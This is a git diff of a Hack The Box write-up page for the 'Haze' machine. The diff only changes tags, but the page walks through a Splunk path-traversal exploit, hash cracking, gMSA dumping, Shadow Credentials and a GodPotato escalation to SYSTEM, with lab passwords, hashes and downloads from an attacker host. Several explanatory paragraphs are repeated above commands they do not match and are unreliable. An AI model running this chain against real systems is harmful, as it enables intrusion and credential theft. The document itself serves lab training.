@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Haze is a Hard difficulty Windows AD machine running <strong>Splunk Enterprise 9.2.1</strong>. The attack begins by exploiting <strong>CVE-2024-36991</strong> (Splunk path traversal) to read sensitive files, extracting a password from the <code>authentication.conf</code> via LFI. After gaining AD access and collecting BloodHound data, the attack chains through <strong>gMSA password dumping</strong>, <strong>AD group ownership manipulation</strong>, <strong>Shadow Credentials</strong> via pyWhisker, and <strong>PKINIT</strong> hash extraction. A Splunk backup is decrypted to find credentials for a user with <strong>SeImpersonatePrivilege</strong>, and <strong>GodPotato</strong> is used to achieve SYSTEM access.</p>
+      <p>Haze is a Hard difficulty Windows AD machine running <code>Splunk Enterprise 9.2.1</code>. The attack begins by exploiting <code>CVE-2024-36991</code> (Splunk path traversal) to read sensitive files, extracting a password from the <code>authentication.conf</code> via LFI. After gaining AD access and collecting BloodHound data, the attack chains through <code>gMSA password dumping</code>, <code>AD group ownership manipulation</code>, <code>Shadow Credentials</code> via pyWhisker, and <code>PKINIT</code> hash extraction. A Splunk backup is decrypted to find credentials for a user with <code>SeImpersonatePrivilege</code>, and <code>GodPotato</code> is used to achieve SYSTEM access.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I start with a full port scan revealing standard AD ports plus Splunk services on ports 8000, 8088, and 8089.</p>
@@ -254,11 +254,11 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 72.90 seconds
            Raw packets sent: 34 (1.472KB) | Rcvd: 33 (1.428KB)</code></pre></div>
       <h3 class="writeup-sub-title">Splunk Web Interface</h3>
-      <p>Port 8000 hosts the Splunk web login page. Version fingerprinting confirms <strong>Splunk Enterprise 9.2.1</strong>.</p>
+      <p>Port 8000 hosts the Splunk web login page. Version fingerprinting confirms <code>Splunk Enterprise 9.2.1</code>.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250407200026.png" alt="Splunk login page" loading="lazy" /><span class="img-caption">Splunk login page</span></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250407204114.png" alt="Splunk version 9.2.1 confirmed" loading="lazy" /><span class="img-caption">Splunk version 9.2.1 confirmed</span></div>
       <h2 class="writeup-section-title">Foothold: Splunk CVE-2024-36991 (Path Traversal)</h2>
-      <p>Searching for Splunk 9.2.1 exploits, I find <strong>CVE-2024-36991</strong> — a path traversal vulnerability that allows reading arbitrary files from the server. I first attempt to extract password hashes from the Splunk <code>passwd</code> file.</p>
+      <p>Searching for Splunk 9.2.1 exploits, I find <code>CVE-2024-36991</code> — a path traversal vulnerability that allows reading arbitrary files from the server. I first attempt to extract password hashes from the Splunk <code>passwd</code> file.</p>
       <div class="code-block"><pre><code>python3 CVE-2024-36991.py -u http://10.129.97.167:8000                                          
 /home/kali/HTB/Haze/CVE-2024-36991/CVE-2024-36991.py:53: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;
   &quot;&quot;&quot;)
@@ -280,7 +280,7 @@ Nmap done: 1 IP address (1 host up) scanned in 72.90 seconds
 :edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
 :mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
 :paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152</code></pre></div>
-      <p>I crack the extracted hash using <strong>John the Ripper</strong> with the <code>rockyou.txt</code> wordlist.</p>
+      <p>I crack the extracted hash using <code>John the Ripper</code> with the <code>rockyou.txt</code> wordlist.</p>
       <div class="code-block"><pre><code>john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
 Using default input encoding: UTF-8
 Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
@@ -385,19 +385,19 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\mark.adams\Documents&gt;</code></pre></div>
       <h3 class="writeup-sub-title">gMSA Password Dump</h3>
-      <p>BloodHound reveals <code>mark.adams</code> can read a <strong>gMSA</strong> (Group Managed Service Account) password. I configure the appropriate permissions and dump the hash using <code>gMSADumper.py</code>.</p>
+      <p>BloodHound reveals <code>mark.adams</code> can read a <code>gMSA</code> (Group Managed Service Account) password. I configure the appropriate permissions and dump the hash using <code>gMSADumper.py</code>.</p>
       <div class="code-block"><pre><code>python3 gMSADumper.py -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 -d haze.htb -l dc01.haze.htb
 Users or groups who can read password for Haze-IT-Backup$:
  &gt; Domain Admins</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\&gt; Get-ADServiceAccount -Identity Haze-IT-Backup$ | Select-Object Name, ObjectClass
 
 Name           ObjectClass
 ----           -----------
 Haze-IT-Backup msDS-GroupManagedServiceAccount</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\&gt; Set-ADServiceAccount -Identity &quot;Haze-IT-Backup$&quot; -PrincipalsAllowedToRetrieveManagedPassword &quot;mark.adams&quot;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\mark.adams\Documents&gt; dsacls &quot;CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB&quot;
  
 Owner: HAZE\Domain Admins
@@ -443,7 +443,7 @@ Deny  HAZE\paul.taylor                SPECIAL ACCESS for msDS-ManagedPasswordInt
                                       READ PROPERTY
 Allow HAZE\gMSA_Managers              SPECIAL ACCESS for msDS-GroupMSAMembership
                                       WRITE PROPERTY</code></pre></div>
-      <p>I use <code>gMSADumper.py</code> to extract the <strong>gMSA</strong> (Group Managed Service Account) password hash. gMSA accounts have their passwords automatically managed by Active Directory — the password is a 256-byte random value stored in the <code>msDS-ManagedPassword</code> attribute and rotated every 30 days (by default). Only principals listed in <code>PrincipalsAllowedToRetrieveManagedPassword</code> can read this value. Since we've added ourselves to the authorized group, we can dump the hash and use it for Pass-the-Hash authentication.</p>
+      <p>I use <code>gMSADumper.py</code> to extract the <code>gMSA</code> (Group Managed Service Account) password hash. gMSA accounts have their passwords automatically managed by Active Directory — the password is a 256-byte random value stored in the <code>msDS-ManagedPassword</code> attribute and rotated every 30 days (by default). Only principals listed in <code>PrincipalsAllowedToRetrieveManagedPassword</code> can read this value. Since we've added ourselves to the authorized group, we can dump the hash and use it for Pass-the-Hash authentication.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Haze/gMSADumper]
 └─$ python3 gMSADumper.py -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 -d haze.htb -l dc01.haze.htb
 Users or groups who can read password for Haze-IT-Backup$:
@@ -506,7 +506,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] - sAMAccountName: Haze-IT-Backup$
 [*] - distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
 [*] OwnerSid modified successfully!</code></pre></div>
-      <p>I use <code>dacledit.py</code> to modify the DACL (Discretionary Access Control List) of the target AD object, granting our controlled account <strong>FullControl</strong> permissions. FullControl is the most permissive right in Active Directory — it allows reading/writing all properties, changing permissions, deleting the object, and performing any operation on it. With this level of access, I can change the target's password, modify group memberships, or add Shadow Credentials.</p>
+      <p>I use <code>dacledit.py</code> to modify the DACL (Discretionary Access Control List) of the target AD object, granting our controlled account <code>FullControl</code> permissions. FullControl is the most permissive right in Active Directory — it allows reading/writing all properties, changing permissions, deleting the object, and performing any operation on it. With this level of access, I can change the target's password, modify group memberships, or add Shadow Credentials.</p>
       <div class="code-block"><pre><code>impacket-dacledit -action write -rights FullControl -principal &#x27;Haze-IT-Backup$&#x27; -target-dn &#x27;CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB&#x27; -dc-ip 10.129.232.50 &quot;haze.htb/Haze-IT-Backup$&quot; -hashes &#x27;:a70df6599d5eab1502b38f9c1c3fd828&#x27;
 /usr/share/doc/python3-impacket/examples/dacledit.py:101: SyntaxWarning: invalid escape sequence &#x27;\V&#x27;
   &#x27;S-1-5-83-0&#x27;: &#x27;NT VIRTUAL MACHINE\Virtual Machines&#x27;,
@@ -548,11 +548,11 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] DACL backed up to dacledit-20250415-003552.bak
 [*] DACL modified successfully!</code></pre></div>
-      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
+      <p>I use <code>bloodyAD</code> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>bloodyAD --host &quot;10.129.232.50&quot; -d &quot;haze.htb&quot; -u &quot;Haze-IT-Backup$&quot; -p &quot;:a70df6599d5eab1502b38f9c1c3fd828&quot; add groupMember SUPPORT_SERVICES Haze-IT-Backup$
 [+] Haze-IT-Backup$ added to SUPPORT_SERVICES</code></pre></div>
       <h3 class="writeup-sub-title">Shadow Credentials & PKINIT</h3>
-      <p>I use <strong>pyWhisker</strong> to add a shadow credential to <code>edward.martin</code>, then <code>gettgtpkinit.py</code> to request a TGT, and finally <code>getnthash.py</code> to extract the NTLM hash. Time synchronization with <code>faketime</code> is critical for Kerberos to work.</p>
+      <p>I use <code>pyWhisker</code> to add a shadow credential to <code>edward.martin</code>, then <code>gettgtpkinit.py</code> to request a TGT, and finally <code>getnthash.py</code> to extract the NTLM hash. Time synchronization with <code>faketime</code> is critical for Kerberos to work.</p>
       <div class="code-block"><pre><code>pywhisker -d &quot;haze.htb&quot; -u &quot;Haze-IT-Backup$&quot; -H &#x27;:a70df6599d5eab1502b38f9c1c3fd828&#x27; --target edward.martin --action add                                                                                                              
 [*] Searching for the target account
 [*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
@@ -599,14 +599,14 @@ INFO:minikerberos:Saved TGT to file</code></pre></div>
       <p>I set the <code>KRB5CCNAME</code> environment variable to specify which Kerberos credential cache file to use for authentication in subsequent commands.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Haze/PKINITtools]
 └─$ export KRB5CCNAME=/home/kali/Haze/PKINITtools/edward.ccache</code></pre></div>
-      <p>I use <code>getnthash.py</code> to extract the user's NTLM hash from the Kerberos session using the <strong>U2U</strong> (User-to-User) mechanism. This technique, known as <strong>UnPAC-the-Hash</strong>, works by requesting a U2U service ticket that contains the user's PAC (Privilege Attribute Certificate), from which the NT hash can be derived. The hash enables Pass-the-Hash attacks without ever knowing the plaintext password.</p>
+      <p>I use <code>getnthash.py</code> to extract the user's NTLM hash from the Kerberos session using the <code>U2U</code> (User-to-User) mechanism. This technique, known as <code>UnPAC-the-Hash</code>, works by requesting a U2U service ticket that contains the user's PAC (Privilege Attribute Certificate), from which the NT hash can be derived. The hash enables Pass-the-Hash attacks without ever knowing the plaintext password.</p>
       <div class="code-block"><pre><code>python getnthash.py -key d73a3f966d30198731b2a6dac970a3b80ae06128d08edda347126945db085450 haze.htb/edward.martin
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Using TGT from cache
 [*] Requesting ticket to self with PAC
 [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code></pre></div>
-      <p>I use <code>getnthash.py</code> to extract the user's NTLM hash from the Kerberos session using the <strong>U2U</strong> (User-to-User) mechanism. This technique, known as <strong>UnPAC-the-Hash</strong>, works by requesting a U2U service ticket that contains the user's PAC (Privilege Attribute Certificate), from which the NT hash can be derived. The hash enables Pass-the-Hash attacks without ever knowing the plaintext password.</p>
+      <p>I use <code>getnthash.py</code> to extract the user's NTLM hash from the Kerberos session using the <code>U2U</code> (User-to-User) mechanism. This technique, known as <code>UnPAC-the-Hash</code>, works by requesting a U2U service ticket that contains the user's PAC (Privilege Attribute Certificate), from which the NT hash can be derived. The hash enables Pass-the-Hash attacks without ever knowing the plaintext password.</p>
       <div class="code-block"><pre><code>faketime &quot;$(ntpdate -q 10.129.232.50 | cut -d &#x27; &#x27; -f 1,2)&quot; \                                                    
 &gt; python getnthash.py -key d73a3f966d30198731b2a6dac970a3b80ae06128d08edda347126945db085450 haze.htb/edward.martin
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -625,7 +625,7 @@ Warning: Remote path completions is disabled due to ruby limitation: undefined m
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\edward.martin&gt; cd Desktop
 *Evil-WinRM* PS C:\Users\edward.martin\Desktop&gt; ls
 
@@ -684,7 +684,7 @@ Mode                 LastWriteTime         Length Name
 [*] Disconnecting Share(1:IPC$)
 [*] Disconnecting Share(2:share)
 [*] Closing down connection (10.129.232.50,62409)</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\backups\splunk&gt; copy C:\backups\splunk\splunk_backup_2024-08-06.zip \\10.10.16.21\share</code></pre></div>
       <p>I extract the compressed archive using the appropriate decompression tool (<code>tar</code> for .tar.bz2, <code>unzip</code> for .zip). The extracted contents may include backup files, configuration data, or user directories containing flags and sensitive information.</p>
       <div class="code-block"><pre><code>──(kali㉿kali)-[/tmp]
@@ -748,7 +748,7 @@ PS C:\Windows\system32&gt;</code></pre></div>
       <p>I run <code>whoami</code> to confirm which user account the current session is running as. This is an essential verification step after every lateral movement or privilege escalation to ensure the attack succeeded and to understand the security context for the next phase.</p>
       <div class="code-block"><pre><code>PS C:\Users\alexander.green\AppData\Local\Temp&gt; whoami
 haze\alexander.green</code></pre></div>
-      <p>I run <code>whoami /all</code> to display the complete security context: username, SID, group memberships, and all assigned privileges. This comprehensive view reveals whether the user has dangerous privileges like <strong>SeImpersonatePrivilege</strong>, <strong>SeBackupPrivilege</strong>, or <strong>SeRestorePrivilege</strong> — each of which has known escalation techniques.</p>
+      <p>I run <code>whoami /all</code> to display the complete security context: username, SID, group memberships, and all assigned privileges. This comprehensive view reveals whether the user has dangerous privileges like <code>SeImpersonatePrivilege</code>, <code>SeBackupPrivilege</code>, or <code>SeRestorePrivilege</code> — each of which has known escalation techniques.</p>
       <div class="code-block"><pre><code>PS C:\Windows\system32&gt; whoami /all
 
 USER INFORMATION
@@ -797,14 +797,14 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.</code></pre></div>
       <h3 class="writeup-sub-title">GodPotato (SeImpersonatePrivilege)</h3>
-      <p>The user <code>alexander.green</code> has <strong>SeImpersonatePrivilege</strong>. I upload <strong>GodPotato-NET4.exe</strong> and use it to execute a command as SYSTEM, reading the root flag.</p>
+      <p>The user <code>alexander.green</code> has <code>SeImpersonatePrivilege</code>. I upload <code>GodPotato-NET4.exe</code> and use it to execute a command as SYSTEM, reading the root flag.</p>
       <div class="code-block"><pre><code>PS C:\&gt; cd $env:TEMP</code></pre></div>
       <p>I start a Python HTTP server (<code>python3 -m http.server</code>) to serve files from the target machine back to my attacker machine. This is a quick and reliable method for exfiltrating files when SSH/SCP isn't available — simply browsing to the target's IP and port from my machine downloads the file.</p>
       <div class="code-block"><pre><code>python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.129.100.204 - - [15/Apr/2025 23:10:25] &quot;GET /GodPotato-NET4.exe HTTP/1.1&quot; 200 -
 10.129.100.204 - - [15/Apr/2025 23:13:59] &quot;GET /GodPotato-NET4.exe HTTP/1.1&quot; 200 -</code></pre></div>
-      <p>I execute <strong>GodPotato</strong> to exploit the <code>SeImpersonatePrivilege</code>, running the specified command as SYSTEM.</p>
+      <p>I execute <code>GodPotato</code> to exploit the <code>SeImpersonatePrivilege</code>, running the specified command as SYSTEM.</p>
       <div class="code-block"><pre><code>PS C:\Users\alexander.green\AppData\Local\Temp&gt; curl http://10.10.16.24:8000/GodPotato-NET4.exe -O GodPotato-NET4.exe
 PS C:\Users\alexander.green\AppData\Local\Temp&gt; ls
 
@@ -822,7 +822,7 @@ Mode                 LastWriteTime         Length Name
 -a----         4/15/2025   6:20 PM           1049 tmpd1ti3j7z                                                          
 -a----         4/15/2025   6:04 PM           1051 tmppk7hzva8                                                          
 -a----         4/15/2025   6:46 PM           1049 tmpxsloeou6</code></pre></div>
-      <p>I execute <strong>GodPotato</strong> to exploit the <code>SeImpersonatePrivilege</code>, running the specified command as SYSTEM.</p>
+      <p>I execute <code>GodPotato</code> to exploit the <code>SeImpersonatePrivilege</code>, running the specified command as SYSTEM.</p>
       <div class="code-block"><pre><code>PS C:\Users\alexander.green\AppData\Local\Temp&gt; .\GodPotato-NET4.exe -cmd &quot;cmd /c type c:\users\Administrator\Desktop\root.txt&quot;        
 [*] CombaseModule: 0x140735297748992
 [*] DispatchTable: 0x140735300340040
